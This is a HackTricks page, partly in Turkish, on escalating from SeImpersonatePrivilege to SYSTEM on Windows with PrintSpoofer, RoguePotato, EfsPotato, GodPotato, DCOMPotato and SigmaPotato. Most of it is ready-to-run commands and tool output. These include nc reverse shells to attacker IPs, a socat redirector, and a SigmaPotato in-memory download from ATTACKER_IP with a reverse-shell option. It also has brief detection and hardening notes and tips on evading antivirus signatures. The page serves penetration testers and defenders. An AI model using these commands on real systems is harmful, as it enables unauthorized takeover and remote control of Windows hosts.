# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Gereksinimler ve yaygın tuzaklar

Aşağıdaki tekniklerin tümü, impersonation yeteneğine sahip ayrıcalıklı bir servisi, aşağıdaki ayrıcalıklardan birine sahip bir bağlamdan kötüye kullanmaya dayanır:

- SeImpersonatePrivilege (en yaygın) veya SeAssignPrimaryTokenPrivilege
- High integrity, token zaten SeImpersonatePrivilege içeriyorsa gerekli değildir (IIS AppPool, MSSQL gibi birçok servis hesabı için tipik).

Ayrıcalıkları hızlıca kontrol edin:
```cmd
whoami /priv | findstr /i impersonate
```
Operasyonel notlar:

- PrintSpoofer, Print Spooler servisinin çalışıyor olmasını ve yerel RPC uç noktası (spoolss) üzerinden erişilebilir olmasını gerektirir. PrintNightmare sonrası Spooler'ın devre dışı bırakıldığı sertleştirilmiş ortamlarda RoguePotato/GodPotato/DCOMPotato/EfsPotato tercih edin.
- RoguePotato, TCP/135 üzerinden erişilebilir bir OXID resolver gerektirir. Egress engelliyse bir redirector/port-forwarder kullanın (aşağıdaki örneğe bakın). Eski build'ler -f bayrağına ihtiyaç duyuyordu.
- EfsPotato/SharpEfsPotato MS-EFSR'i kötüye kullanır; eğer bir pipe engellenmişse alternatif pipe'ları deneyin (lsarpc, efsrpc, samr, lsass, netlogon).
- RpcBindingSetAuthInfo sırasında oluşan Error 0x6d3 genellikle bilinmeyen/desteklenmeyen bir RPC kimlik doğrulama servisini gösterir; farklı bir pipe/transport deneyin ya da hedef servisin çalıştığından emin olun.

## Hızlı Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notlar:
- Mevcut konsolda etkileşimli bir süreç başlatmak için -i, tek satırlık bir komut çalıştırmak için -c kullanabilirsiniz.
- Spooler service gerektirir. Devre dışıysa bu başarısız olur.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Eğer outbound 135 engellenmişse, redirector üzerinde socat ile OXID resolver'ı pivot edin:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
İpucu: Bir pipe başarısız olursa veya EDR bunu engelliyorsa, diğer desteklenen pipe'leri deneyin:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notlar:
- SeImpersonatePrivilege mevcut olduğunda Windows 8/8.1–11 ve Server 2012–2022'de çalışır.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, varsayılan olarak RPC_C_IMP_LEVEL_IMPERSONATE olan hizmet DCOM nesnelerini hedefleyen iki varyant sağlar. Sağlanan ikili dosyaları derleyin veya kullanın ve komutunuzu çalıştırın:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (güncellenmiş GodPotato fork)

SigmaPotato, .NET reflection aracılığıyla in-memory execution ve PowerShell reverse shell helper gibi modern kolaylıklar ekler.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Tespit ve sertleştirme notları

- Monitor for processes creating named pipes and immediately calling token-duplication APIs followed by CreateProcessAsUser/CreateProcessWithTokenW. Sysmon can surface useful telemetry: Event ID 1 (process creation), 17/18 (named pipe created/connected), and command lines spawning child processes as SYSTEM.
- Spooler sertleştirmesi: Gereksiz olduğu sunucularda Print Spooler servisini devre dışı bırakmak, spoolss aracılığıyla gerçekleşen PrintSpoofer-style yerel suistimalleri engeller.
- Hizmet hesabı sertleştirmesi: Özel servislere SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege atamasını en aza indirin. Mümkünse servisleri virtual accounts altında gerekli en düşük ayrıcalıklarla çalıştırmayı ve service SID ile write-restricted tokens kullanarak izole etmeyi düşünün.
- Network kontrolleri: Outbound TCP/135 trafiğini engellemek veya RPC endpoint mapper trafiğini kısıtlamak, bir internal redirector yoksa RoguePotato'yu bozabilir.
- EDR/AV: Bu araçların tamamı yaygın şekilde signatured. Kaynaktan yeniden derlemek, symbols/strings'i yeniden adlandırmak veya in-memory execution kullanmak tespiti azaltabilir ancak sağlam davranış tabanlı tespitleri aşmaz.

## Referanslar

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
